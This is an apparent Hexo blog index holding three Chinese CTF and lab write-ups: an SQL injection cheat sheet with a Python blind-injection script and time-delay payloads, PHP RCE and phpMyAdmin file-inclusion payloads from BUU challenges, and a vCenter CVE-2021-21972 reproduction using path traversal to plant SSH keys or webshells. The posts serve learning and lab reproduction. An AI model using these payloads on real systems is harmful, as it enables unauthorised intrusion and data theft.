<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>SQL注入学习</title>
    <url>/2022/11/06/SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h2 id="SQL注入姿势小结"><a href="#SQL注入姿势小结" class="headerlink" title="SQL注入姿势小结"></a>SQL注入姿势小结</h2><p>最近开始了SQL部分的刷题，这一部分的知识真的非常的杂乱，光是各种语句的使用这一方面，就让我非常的头疼。每一个知识点都很特别，加之SQL又是WEB这一块非常重要的部分，这让我觉得是时候养成写blog总结知识的习惯了。那么今后会不断记录下我在刷题和比赛中遇到的知识点。  </p>
<hr>
<h3 id="1-基础知识"><a href="#1-基础知识" class="headerlink" title="1.基础知识"></a>1.基础知识</h3><p>1.1语句文档 <a href="https://www.sqlite.org/lang.html">query language</a><br>这应该是最全面的文档了，虽然暂时我还不是完全能看懂里面的内容。<br>1.2万能密码 1’ or 1&#x3D;1 –+<br>主要还是要根据源码中的查询结构进行判断，总之注意闭合查询语句就行。  </p>
<p>其他基本的mysql的知识runoob啥的都能看，在跟大佬们学习的时候，他们强调的最多的就是多看文档，这是CTF学习中很关键的部分。</p>
<hr>
<h3 id="2-写shell"><a href="#2-写shell" class="headerlink" title="2.写shell"></a>2.写shell</h3><p>这个能用的地方应该比较少，不过还是很好用的，直接构造一句话马，然后into outfile，写进新文件就行  </p>
<hr>
<h3 id="3-简单过滤"><a href="#3-简单过滤" class="headerlink" title="3.简单过滤"></a>3.简单过滤</h3><h4 id="3-1简单waf过滤回显"><a href="#3-1简单waf过滤回显" class="headerlink" title="3.1简单waf过滤回显"></a>3.1简单waf过滤回显</h4><p>特定字符串被ban的情况，考虑to_base64编码  </p>
<h4 id="3-2过滤数字"><a href="#3-2过滤数字" class="headerlink" title="3.2过滤数字"></a>3.2过滤数字</h4><p>可以考虑replace语句进行替换  </p>
<h4 id="3-3过滤空格"><a href="#3-3过滤空格" class="headerlink" title="3.3过滤空格"></a>3.3过滤空格</h4><p>%09 %0a %0b %0c %0d &#x2F;**&#x2F; ()<br>看到其他师傅说可以手工闭合，但是没太懂什么意思，之后再了解吧  </p>
<h4 id="3-4过滤"><a href="#3-4过滤" class="headerlink" title="3.4过滤#,-,+"></a>3.4过滤#,-,+</h4><p>考虑和过滤空格一样的绕过方法，毕竟#&#x3D;–+</p>
<h4 id="3-5过滤select"><a href="#3-5过滤select" class="headerlink" title="3.5过滤select"></a>3.5过滤select</h4><p>先看看能不能大小写绕过<br>不行的话考虑看看能不能用and优先级绕过<br>原理为or()and，and的优先级大于or,注意闭合前后的引号就好了<br>优先级可以结合爆破来用，毕竟flag所在位置不是那么好看出来  </p>
<h4 id="3-6过滤引号"><a href="#3-6过滤引号" class="headerlink" title="3.6过滤引号"></a>3.6过滤引号</h4><p>过滤单引号的情况比较特殊，我们可以通过巧妙使用\将原语句的单引号转义，寻找插入点。</p>
<hr>
<h3 id="4-布尔盲注"><a href="#4-布尔盲注" class="headerlink" title="4.布尔盲注"></a>4.布尔盲注</h3><h4 id="4-1基础布尔盲注脚本，"><a href="#4-1基础布尔盲注脚本，" class="headerlink" title="4.1基础布尔盲注脚本，"></a>4.1基础布尔盲注脚本，</h4><p>布尔盲注针对有回显，且回显可以判断True or False。可以利用二分法，正则匹配等小技巧，这里给出一个小脚本  </p>
<pre><code><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests  </span><br><span class="line">url=<span class="string">&quot;http://9aae5399-f881-4f8c-bff7-1ed5ac39de1b.challenge.ctf.show/api/v4.php?id=1&quot;</span>  </span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span>  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):  </span><br><span class="line">	<span class="built_in">max</span>=<span class="number">127</span>   </span><br><span class="line">	<span class="built_in">min</span>=<span class="number">32</span>  </span><br><span class="line">	<span class="keyword">while</span> <span class="number">1</span>:  </span><br><span class="line">		mid=(<span class="built_in">max</span>+<span class="built_in">min</span>)&gt;&gt;<span class="number">1</span>  </span><br><span class="line">		<span class="keyword">if</span>(<span class="built_in">min</span>==mid):  </span><br><span class="line">			flag+=<span class="built_in">chr</span>(mid)  </span><br><span class="line">			<span class="built_in">print</span>(flag)  </span><br><span class="line">			<span class="keyword">break</span>  	</span><br><span class="line">		payload=<span class="string">&quot;&#x27;and ascii(substr((select group_concat(password) from ctfshow_user4 where password regexp(&#x27;^ctf&#x27;)),&#123;&#125;,1))&lt;&#123;&#125;+--+&quot;</span>.<span class="built_in">format</span>(i,mid)    </span><br><span class="line">		res=requests.get(url+payload)  </span><br><span class="line">		<span class="keyword">if</span> <span class="string">&#x27;admin&#x27;</span> <span class="keyword">in</span> res.text:  </span><br><span class="line">			<span class="built_in">max</span>=mid  </span><br><span class="line">		<span class="keyword">else</span>:  </span><br><span class="line">			<span class="built_in">min</span>=mid  	</span><br></pre></td></tr></table></figure>
</code></pre>
<h4 id="4-2过滤函数"><a href="#4-2过滤函数" class="headerlink" title="4.2过滤函数"></a>4.2过滤函数</h4><p>大体思路就是，能用ascii可以考虑二分法，ascii过滤了，考虑ord或者mid，并与substr连用<br>如果不能用二分法，可以考虑if语句，直接进行字符的判断，搭配regexp或者like语句进行匹配  </p>
<h4 id="4-3其他过滤"><a href="#4-3其他过滤" class="headerlink" title="4.3其他过滤"></a>4.3其他过滤</h4><h5 id="4-3-1常规过滤"><a href="#4-3-1常规过滤" class="headerlink" title="4.3.1常规过滤"></a>4.3.1常规过滤</h5><p>空格可用()绕<br>考虑regexp  </p>
<h5 id="4-3-2过滤引号"><a href="#4-3-2过滤引号" class="headerlink" title="4.3.2过滤引号"></a>4.3.2过滤引号</h5><p>过滤了引号就用不了reg了<br>考虑having代替where，like代替regexp，利用16进制编码来绕引号  </p>
<h5 id="4-3-3过滤引号加数字"><a href="#4-3-3过滤引号加数字" class="headerlink" title="4.3.3过滤引号加数字"></a>4.3.3过滤引号加数字</h5><p>多过滤了数字就用不了16进制编码了，考虑使用mysql中的true&#x3D;1这个点来绕数字<br>引号的话，可以考虑在like语句中用concat+chr来绕  </p>
<hr>
<h3 id="5-MD5注入"><a href="#5-MD5注入" class="headerlink" title="5.MD5注入"></a>5.MD5注入</h3><p>主要是利用md5中参数true，将字符串转换为原始16进制字符串，利用乱码&#x3D;1来进行注入（记得闭合）<br>可用payload&#x3D;ffifdyop<br>payload&#x3D;129581926211651571912466741651878684928  </p>
<hr>
<h3 id="6-mysql弱比较"><a href="#6-mysql弱比较" class="headerlink" title="6.mysql弱比较"></a>6.mysql弱比较</h3><p>username&#x3D;0，返回所有字母开头字符串<br>username&#x3D;1，仅返回1开头的字符串<br>在进行字符串和数字进行比较时，mysql会将字符串当作数字处理  </p>
<hr>
<h3 id="7-堆叠注入"><a href="#7-堆叠注入" class="headerlink" title="7.堆叠注入"></a>7.堆叠注入</h3><p>堆叠注入就是用；来让多条语句执行，在没有过滤；时可以考虑<br>&#96;&#96;可以用来区分保留字，所以可以用来包含库名表名等，也就是可以用来绕空格  </p>
<h5 id="三种手段的堆叠注入"><a href="#三种手段的堆叠注入" class="headerlink" title="三种手段的堆叠注入"></a>三种手段的堆叠注入</h5><p>非常经典的<a href="https://blog.csdn.net/rfrder/article/details/108583338?ops_request_misc=%25257B%252522request%25255Fid%252522%25253A%252522161302934516780261953454%252522%25252C%252522scm%252522%25253A%25252220140713.130102334.pc%25255Fblog.%252522%25257D&request_id=161302934516780261953454&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v1~rank_blog_v1-5-108583338.pc_v1_rank_blog_v1&utm_term=%25E5%25BC%25BA%25E7%25BD%2591%25E6%259D%25AF">强网杯随便注</a><br>主要就是handler语句，prepare语句，和alter语句。注意与16进制编码结合能够绕过一些过滤。</p>
<hr>
<h3 id="8-sqlmap"><a href="#8-sqlmap" class="headerlink" title="8.sqlmap"></a>8.sqlmap</h3><p>具体的技巧可以参考这个博主的文章，写的很详细<a href="https://www.cnblogs.com/lcxblogs/p/14274271.html">sqlmap</a><br>一些小总结：<br>1.–referer，指定请求头中的referer字段，可以是用–level提高等级来替代<br>2.–data，指定传的参数<br>3.–method,当使用put方式时，记得设置请求头中的Content-Type字段为text&#x2F;plain<br>4.–cookie，抓包拿cookie，再设置就行<br>5.–safe-url+–safe-freq，隔一段时间访问安全页面<br>6.–os-shell，拿交互式shell，可用来传一句话马<br>7.–tamper，使用用户自定义脚本，因为我的虚拟机是kali，所以在&#x2F;usr&#x2F;share&#x2F;sqlmap里面写好脚本，就可以直接使用了  </p>
<hr>
<h3 id="9-时间盲注"><a href="#9-时间盲注" class="headerlink" title="9.时间盲注"></a>9.时间盲注</h3><h4 id="9-1-sleep"><a href="#9-1-sleep" class="headerlink" title="9.1 sleep"></a>9.1 sleep</h4><p>这是最简单的方法，直接设定睡眠时间  </p>
<h4 id="9-2-rlike"><a href="#9-2-rlike" class="headerlink" title="9.2 rlike"></a>9.2 rlike</h4><p>经典的redos方法，原理就是利用正则匹配的计算消耗，当字符串足够长时，会产生一定的延时，可以使用下面的payload：  </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">concat(rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;)) RLIKE &#x27;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b&#x27;</span><br></pre></td></tr></table></figure>
<h4 id="9-3-benchmark"><a href="#9-3-benchmark" class="headerlink" title="9.3 benchmark"></a>9.3 benchmark</h4><p>benchmark是一个将命令执行指定次数的函数，可以用下面的payload：  </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">benchmark(6666666,sha(1))</span><br></pre></td></tr></table></figure>
<h4 id="9-4-笛卡尔积"><a href="#9-4-笛卡尔积" class="headerlink" title="9.4 笛卡尔积"></a>9.4 笛卡尔积</h4><p>原理就是对数据库，表，列进行拼接时，会按照笛卡尔积的方式拼接，一个5条数据的表select两次就变成25条数据，当数据记录很多时，拼接起来就会产生一定的时延，可以用来时间盲注，一个简单payload：  </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select count(*) information_schema.columns a,information_schema.columns b,information_schema.columns c</span><br></pre></td></tr></table></figure>
<h4 id="9-5-总结"><a href="#9-5-总结" class="headerlink" title="9.5 总结"></a>9.5 总结</h4><p>时间盲注太折磨了，受限于网速的原因，时间阈值把握不好的话，就很容易拿到错误的flag，而且在用笛卡尔积的时候，还把网页跑崩了好几次，总的来说，非常折磨~  </p>
<hr>
<h3 id="10-limit注入"><a href="#10-limit注入" class="headerlink" title="10.limit注入"></a>10.limit注入</h3><p>主要的知识点就是limit语句之后只能跟两个参数，一个是into，另一个是procedure analyse。<br>into的话需要我们有写shell的权限，不然没有用。<br>考虑procedure后面跟报错语句来完成注入</p>
<hr>
<h3 id="11-information-schema过滤和无列名注入"><a href="#11-information-schema过滤和无列名注入" class="headerlink" title="11.information_schema过滤和无列名注入"></a>11.information_schema过滤和无列名注入</h3><p>当遇到information_schema过滤，我们可以考虑mysql.innodb_table_stats进行库名和表名的查询，但是这样是查不到列名的，我们必须要使用无列名注入来获取列名，参考下面两篇文章：<br><a href="https://www.cnblogs.com/GH-D/p/11962522.html">join无列名注入</a><br><a href="https://blog.csdn.net/qq_45521281/article/details/106647880">Bypass information_schema与无列名注入</a> </p>
<hr>
<h3 id="12-insert注入"><a href="#12-insert注入" class="headerlink" title="12.insert注入"></a>12.insert注入</h3><p>如果有insert语句，我们可以利用闭合原语句的方式，再构造查询语句，利用insert将查询结果回显。</p>
<hr>
<h3 id="13-报错注入"><a href="#13-报错注入" class="headerlink" title="13.报错注入"></a>13.报错注入</h3><p>常用的报错注入，大部分人都总结的很好了，看下面的blog<br><a href="https://xz.aliyun.com/t/253">报错注入</a><br>注意group by报错注入中，如果floor过滤了，可以使用ceil和round。</p>
<hr>
<h3 id="14-UDF注入"><a href="#14-UDF注入" class="headerlink" title="14.UDF注入"></a>14.UDF注入</h3><p>其实就是提权注入的一种，简言之，就是以mysql的权限去执行系统命令。具体可以看下面这篇文章：<a href="https://www.hetianlab.com/specialized/20220810104419">数据库注入提权总结（二）</a></p>
<hr>
<h3 id="15-nosql注入"><a href="#15-nosql注入" class="headerlink" title="15.nosql注入"></a>15.nosql注入</h3><p>nosql其实就是不同于关系型数据库的一种数据库。我所遇到的是mongoDB，之后遇到其他的在慢慢总结。<br>主要的利用方式就是利用[$ne],[$regex]等方式进行查询<br>可以看这篇nosql注入总结：<a href="http://rui0.cn/archives/609">nosql注入笔记</a></p>
<hr>
<p>目前刷的sql题大概就是这些，之后遇到新的注入手法再慢慢积累吧。<br>最近在学习php反序列化，顺便摸索渗透中，遇到什么有意思的再开一篇记录吧~</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>SQL</tag>
      </tags>
  </entry>
  <entry>
    <title>buu刷题记录</title>
    <url>/2023/04/07/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h1 id="1-BJDCTF2020-ZJCTF，不过如此"><a href="#1-BJDCTF2020-ZJCTF，不过如此" class="headerlink" title="1.[BJDCTF2020]ZJCTF，不过如此"></a>1.[BJDCTF2020]ZJCTF，不过如此</h1><p>题目：</p>
<pre><code>&lt;?php
$id = $_GET[&#39;id&#39;];
$_SESSION[&#39;id&#39;] = $id;

function complex($re, $str) &#123;
return preg_replace(
&#39;/(&#39; . $re . &#39;)/ei&#39;,
&#39;strtolower(&quot;\\1&quot;)&#39;,
$str
);
&#125;


foreach($_GET as $re =&gt; $str) &#123;
echo complex($re, $str). &quot;\n&quot;;
&#125;

function getFlag()&#123;
    @eval($_GET[&#39;cmd&#39;]);
&#125;
</code></pre>
<p>这是一个利用php preg_match函数RCE漏洞的题，参考：<a href="https://xz.aliyun.com/t/2557">https://xz.aliyun.com/t/2557</a><br>大致思路就是构造 <code>preg_replace(&#39;(&#39;.*&#39;)/ei&#39;,&#39;strtolower(&quot;\\1&quot;)&#39;,&#123;$&#123;函数&#125;&#125;  </code><br>注意几个点：<br>1.&#x2F;e能够让第二个匹配的字符串参数能够执行函数，而\1代表正则匹配\1，也就是匹配到的第一个子字符串；<br>2.GET传参时，如果参数以.开头，会自动将第一个非法字符转换成_，所以可以将.替换为\S；<br>3.最后匹配的字符串中${}使用了PHP可变变量，也就是{}中的内容会先被当作变量执行，然后再将返回结果进行处理。  </p>
<p>所以最后的payload为<code>?\S*=&#123;$&#123;eval($_POST[cmd])&#125;&#125;,POST传参cmd=system(&#39;cat /flag&#39;);</code></p>
<hr>
<h1 id="2-GWCTF-2019-我有一个数据库"><a href="#2-GWCTF-2019-我有一个数据库" class="headerlink" title="2.[GWCTF 2019]我有一个数据库"></a>2.[GWCTF 2019]我有一个数据库</h1><p>进入题目找不到额外信息，直接dirsearch扫，发现有phpmyadmin，进入查看，发现版本号为4.8.1，直接利用<a href="https://www.freebuf.com/column/207707.html">phpmyadmin文件包含漏洞</a><br>利用思路就是phpadmin在传target参数时，会对参数进行检查，如果参数在白名单中返回true，同时考虑到有参数的情况，对参数进行了urldecode，并以?为界限进行分割。<br>因此可以将?二次编码，之后服务器解码一次，传参时又解码一次，使分割出来的字符串前半部分匹配到白名单，从而实现文件包含。 </p>
<pre><code>payload：url/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../../../flag
</code></pre>
<hr>
<h1 id="3-网鼎杯-2020-朱雀组-Nmap"><a href="#3-网鼎杯-2020-朱雀组-Nmap" class="headerlink" title="3.[网鼎杯 2020 朱雀组]Nmap"></a>3.[网鼎杯 2020 朱雀组]Nmap</h1><p>这题是和nmap有关，扫描127，抓包。可以得知先发送了一个POST请求，再发送一个带有参数f的GET请求，修改f的值会得到报错：simplexml_load_file(): I&#x2F;O warning : failed to load external entity “xml&#x2F;xxxxx” in &#x2F;var&#x2F;www&#x2F;html&#x2F;result.php on line 23<br>由此可知，是将nmap的扫描结果存储到了xml文件中，再对该文档进行解析。<br>nmap常用的保存文件的参数还有-oN -oG这些，因此可以利用写一句话木马并保存成php文件的方法来打。<br>剩下就是一些简单的php过滤方法，段标签加改后缀即可。<br>主要问题是它后端应该还使用了php的excapeshellarg+escapeshellcmd()进行过滤，之前遇到过，但是有点不太记得了，趁这次整理一下。<br>主要的原理就是escapeshellarg()将给字符串增加一个单引号，并且能引用或者转码任何已经存在的单引号<br>而escapeshellcmd()对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义，转义的字符包括：&amp;#;&#96;|*?~&lt;&gt;^()[]{}$\<br>总之就是，这两个函数一起用会导致原本增加的引号被闭合了，导致无法起到转义特殊字符的作用<br>重点是前后加引号，且引号与注入的命令之间要留有空格，因为如果后面的’和命令之间没有空格，经过函数的处理后会多出来一个\，导致命令注入失败。</p>
<hr>
<p>#4.[CISCN 2019 初赛]Love Math<br>不愧是国赛的题啊，出的好牛啊</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span><br><span class="line">if(!isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    //例子 c=20-1</span><br><span class="line">    $content = $_GET[&#x27;c&#x27;];</span><br><span class="line">    if (strlen($content) &gt;= 80) &#123;</span><br><span class="line">        die(&quot;太长了不会算&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $blacklist = [&#x27; &#x27;, &#x27;\t&#x27;, &#x27;\r&#x27;, &#x27;\n&#x27;,&#x27;\&#x27;&#x27;, &#x27;&quot;&#x27;, &#x27;`&#x27;, &#x27;\[&#x27;, &#x27;\]&#x27;];</span><br><span class="line">    foreach ($blacklist as $blackitem) &#123;</span><br><span class="line">        if (preg_match(&#x27;/&#x27; . $blackitem . &#x27;/m&#x27;, $content)) &#123;</span><br><span class="line">            die(&quot;请不要输入奇奇怪怪的字符&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span><br><span class="line">    $whitelist = [&#x27;abs&#x27;, &#x27;acos&#x27;, &#x27;acosh&#x27;, &#x27;asin&#x27;, &#x27;asinh&#x27;, &#x27;atan2&#x27;, &#x27;atan&#x27;, &#x27;atanh&#x27;, &#x27;base_convert&#x27;, &#x27;bindec&#x27;, &#x27;ceil&#x27;, &#x27;cos&#x27;, &#x27;cosh&#x27;, &#x27;decbin&#x27;, &#x27;dechex&#x27;, &#x27;decoct&#x27;, &#x27;deg2rad&#x27;, &#x27;exp&#x27;, &#x27;expm1&#x27;, &#x27;floor&#x27;, &#x27;fmod&#x27;, &#x27;getrandmax&#x27;, &#x27;hexdec&#x27;, &#x27;hypot&#x27;, &#x27;is_finite&#x27;, &#x27;is_infinite&#x27;, &#x27;is_nan&#x27;, &#x27;lcg_value&#x27;, &#x27;log10&#x27;, &#x27;log1p&#x27;, &#x27;log&#x27;, &#x27;max&#x27;, &#x27;min&#x27;, &#x27;mt_getrandmax&#x27;, &#x27;mt_rand&#x27;, &#x27;mt_srand&#x27;, &#x27;octdec&#x27;, &#x27;pi&#x27;, &#x27;pow&#x27;, &#x27;rad2deg&#x27;, &#x27;rand&#x27;, &#x27;round&#x27;, &#x27;sin&#x27;, &#x27;sinh&#x27;, &#x27;sqrt&#x27;, &#x27;srand&#x27;, &#x27;tan&#x27;, &#x27;tanh&#x27;];</span><br><span class="line">    preg_match_all(&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;, $content, $used_funcs);  </span><br><span class="line">    foreach ($used_funcs[0] as $func) &#123;</span><br><span class="line">        if (!in_array($func, $whitelist)) &#123;</span><br><span class="line">            die(&quot;请不要输入奇奇怪怪的函数&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    //帮你算出答案</span><br><span class="line">    eval(&#x27;echo &#x27;.$content.&#x27;;&#x27;);</span><br></pre></td></tr></table></figure>
<p>想要拿flag需要提交c参数，黑名单过滤了一些符号，白名单限制了使用的函数。<br>法一：<br><code>payload:?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi)&#123;pi&#125;(($$pi)&#123;abs&#125;)&amp;pi=system&amp;abs=cat%20/flag</code><br>利用进制转换构造_GET，也就是$pi的值。之后利用php可变变量$$pi来构造预定义变量$_GET。用{}来代替[]。因为限制了payload长度，所以选用白名单中最短的pi和abs两个函数作为参数。<br>法二：<br><code>payload:?c=$pi=(is_nan^(6).(4)).(tan^(1).(5));($$pi)&#123;0&#125;(($$pi)&#123;1&#125;)&amp;0=system&amp;1=cat /flag</code><br>用异或构造语句，其中的<code>is_nan^(6).(4)</code>和<code>tan^(1).(5)</code>是由Mond师傅的fuzz脚本得到的：<a href="https://www.cnblogs.com/20175211lyz/p/11588219.html">刷题记录：[CISCN 2019 初赛]Love Math</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$payload = [&#x27;abs&#x27;, &#x27;acos&#x27;, &#x27;acosh&#x27;, &#x27;asin&#x27;, &#x27;asinh&#x27;, &#x27;atan2&#x27;, &#x27;atan&#x27;, &#x27;atanh&#x27;,  &#x27;bindec&#x27;, &#x27;ceil&#x27;, &#x27;cos&#x27;, &#x27;cosh&#x27;, &#x27;decbin&#x27; , &#x27;decoct&#x27;, &#x27;deg2rad&#x27;, &#x27;exp&#x27;, &#x27;expm1&#x27;, &#x27;floor&#x27;, &#x27;fmod&#x27;, &#x27;getrandmax&#x27;, &#x27;hexdec&#x27;, &#x27;hypot&#x27;, &#x27;is_finite&#x27;, &#x27;is_infinite&#x27;, &#x27;is_nan&#x27;, &#x27;lcg_value&#x27;, &#x27;log10&#x27;, &#x27;log1p&#x27;, &#x27;log&#x27;, &#x27;max&#x27;, &#x27;min&#x27;, &#x27;mt_getrandmax&#x27;, &#x27;mt_rand&#x27;, &#x27;mt_srand&#x27;, &#x27;octdec&#x27;, &#x27;pi&#x27;, &#x27;pow&#x27;, &#x27;rad2deg&#x27;, &#x27;rand&#x27;, &#x27;round&#x27;, &#x27;sin&#x27;, &#x27;sinh&#x27;, &#x27;sqrt&#x27;, &#x27;srand&#x27;, &#x27;tan&#x27;, &#x27;tanh&#x27;];</span><br><span class="line">for($k=1;$k&lt;=sizeof($payload);$k++)&#123;</span><br><span class="line">    for($i = 0;$i &lt; 9; $i++)&#123;</span><br><span class="line">        for($j = 0;$j &lt;=9;$j++)&#123;</span><br><span class="line">            $exp = $payload[$k] ^ $i.$j;</span><br><span class="line">            echo($payload[$k].&quot;^$i$j&quot;.&quot;==&gt;$exp&quot;);</span><br><span class="line">            echo &quot;&lt;br /&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>因为在异或的时候会把整数类型转换成字符串类型与payload中的参数进行异或运算，所以i，j是字符串类型，也就是利用这些函数名与0-99的字符串异或。而<code>is_nan^(6).(4)</code>和<code>tan^(1).(5)</code>刚好可以获得_G和ET，之后就和方法一一样了。<br>法三：<br>通过getallheaders函数，利用请求头构造payload<br>该函数会获取http请求头的信息，所以可以在payload里传参数，再构造一个请求头字段，写入要执行的命令。<br><code>payload:?c=$pi=base_convert,$pi(696468,10,36)($pi(8768397090111664438,10,30)()&#123;1&#125;)</code><br>即c传入exec(getallheaders(){1})，再在请求头构造字段1&#x3D;cat &#x2F;flag就ok了。</p>
<hr>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
  </entry>
  <entry>
    <title>vcenter漏洞复现</title>
    <url>/2023/05/16/vcenter%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h1 id="CVE-2021-21972"><a href="#CVE-2021-21972" class="headerlink" title="CVE-2021-21972"></a>CVE-2021-21972</h1><h2 id="产品介绍"><a href="#产品介绍" class="headerlink" title="产品介绍"></a>产品介绍</h2><p>vSphere是在数据中心产品下的一套软件，ESXi是vSphere中最重要的一个组件，是虚拟化服务，所有的虚拟机都运行在ESXi服务上。<br>vSphere (web) Client是一个管理平台，它能够直接管理多个不同的ESXi主机。在ESXi6.0之前通过C&#x2F;S架构来管理ESXi集群，并没有web端，在6.0版本之后，采用web管理平台，而部署了这个web管理平台的vSphere web Client服务器称为vCenter Server。</p>
<h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>vCenter中默认启用的vRops插件中，ServicesController类的uploadova接口存在未授权访问，可利用路径穿越文件解压至特定目录实现getshell。</p>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>7.0 &lt;&#x3D; vCenter Server &lt; 7.0 U1c<br>6.7 &lt;&#x3D; vCenter Server &lt; 6.7 U3l<br>6.5 1e &lt;&#x3D; vCenter Server &lt; 6.5 U3n<br>4.x &lt;&#x3D; Cloud Foundation (vCenter Server) &lt; 4.2<br>3.x &lt;&#x3D; Cloud Foundation (vCenter Server) &lt; 3.10.1.2  </p>
<h2 id="漏洞环境搭建"><a href="#漏洞环境搭建" class="headerlink" title="漏洞环境搭建"></a>漏洞环境搭建</h2><p>1.官网下载ESXi6.7.0，按步骤安装至vmware workstation中，安装好后进入ESXi进行网络配置，安装详细过程可见链接：<a href="https://blog.csdn.net/z136370204/article/details/111719373">VMware vSphere 6.7 虚拟化搭建及配置完整详细手册</a><br>2.下载指定版本vcenter iso文件，我使用的是u2以及u3j版本的vcenter，下载之后挂载iso，进入安装，网上都有教程，一步步来就行。<br>3.安装好之后，开启SSH，SSH登录到vCenter，将所有vCenter服务器相关的jar文件复制到统一路径下，再进行下载，注意使用8010端口起http服务，其他端口要么被占用了，要么没在白名单里。<br>4.之后修改文件<code>/etc/vmware/vmware-vmon/svcCfgfiles/vsphere-ui.json</code><br>将以下内容注释取消：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//&quot;-Xdebug&quot;,</span><br><span class="line">//&quot;-Xnoagent&quot;,</span><br><span class="line">//&quot;-Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=8002&quot;,</span><br></pre></td></tr></table></figure>
<p>之后按顺序重启vsphere-ui服务，打开防火墙即可：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">service-control --restart vsphere-ui</span><br><span class="line">iptables -P INPUT ACCEPT</span><br><span class="line">iptables -P OUTPUT ACCEPT</span><br></pre></td></tr></table></figure>
<p>5.IDEA设置好远程JVM即可进行远程调试，但是这个洞涉及到的代码部分比较简单，所以就直接静态分析了。</p>
<h2 id="漏洞代码分析"><a href="#漏洞代码分析" class="headerlink" title="漏洞代码分析"></a>漏洞代码分析</h2><p>造成漏洞主要代码定位到vropsplugin-service.jar包中，com.vmware.vropspluginui.mvc.ServicesController类中有关于文件上传的代码。<br><img src="/2023/05/16/vcenter%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1.jpg" alt="1"><br>代码逻辑就是将tar文件解压上传到<code>/tmp/unicorn_ova_dir</code>目录。注意到如下部分：<br><img src="/2023/05/16/vcenter%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/2.jpg" alt="2"><br>直接将tar的文件名与<code>/tmp/unicorn_ova_dir</code>拼接并写入文件，如果文件名存在<code>../</code>即可实现目录遍历。  </p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="ssh写公钥getshell"><a href="#ssh写公钥getshell" class="headerlink" title="ssh写公钥getshell"></a>ssh写公钥getshell</h3><p>找一找可利用的方法，既然是能够实现目录遍历的文件上传，先看一看vsphere-ui用户有写权限的目录：  </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">su vsphere-ui</span><br><span class="line">find / -writable -type d |&amp; grep -v &quot;Permission denied&quot;</span><br><span class="line">```  </span><br><span class="line">发现`.ssh`可写，能够上传公钥，在本地写个公钥上传到vcenter:  </span><br><span class="line">![ssh](ssh.jpg)</span><br><span class="line">之后就能够利用私钥直接登录vsphere-ui用户了：  </span><br><span class="line">![3](3.jpg)  </span><br><span class="line">但是这个方法有个弊端，看一下shadow文件，可以看到：   </span><br><span class="line">![4](4.jpg) </span><br><span class="line">vsphere-ui用户密码过期时间为90天，需要提供原密码来修改密码，而原密码未设置（不是空密码），所以没法修改密码，大概就是只能利用90天，不过正常打的话感觉也够了。  </span><br><span class="line">### 上传webshell</span><br><span class="line">另一种思路是写入webshell，首先需要遍历找出有jsp的web.xml，并且目录可写：  </span><br><span class="line">![xml](web-xml.jpg)</span><br><span class="line">使用`VMware-VCSA-all-6.7.0-8217866`实现，`web`的资源目录为`/usr/lib/vmware-vsphere-ui/server/work/deployer/s/global/%d/0/h5ngc.war/resources/`,其中%d是随着重启行为发生改变的，所以可以构造上传包进行暴力批量添加。  